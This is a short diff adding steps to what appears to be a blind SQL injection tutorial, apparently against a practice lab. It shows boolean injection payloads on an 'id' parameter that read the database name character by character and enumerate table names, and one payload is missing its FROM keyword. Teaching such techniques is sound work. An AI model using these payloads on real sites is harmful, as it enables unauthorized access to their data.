@@ -285,6 +285,18 @@ After that u will get this....
 
 **You are in....**
 
+It means the value 99 is true.
+
+Let us see what happens if we change the value 99 to 98:
+
+**?id=1′ AND (ascii(substr((select database()) ,3,3)) = 98**
+
+We see that nothing happens on screen and we conclude that we get a false.
+
+Now we start to enumerate the database. The query is
+
+**id=1′ AND (ascii(substr((select table_name information_schema.tables where table_schema=database()limit 0,1) ,1,1)) < 105 –+**
+
 
 
 
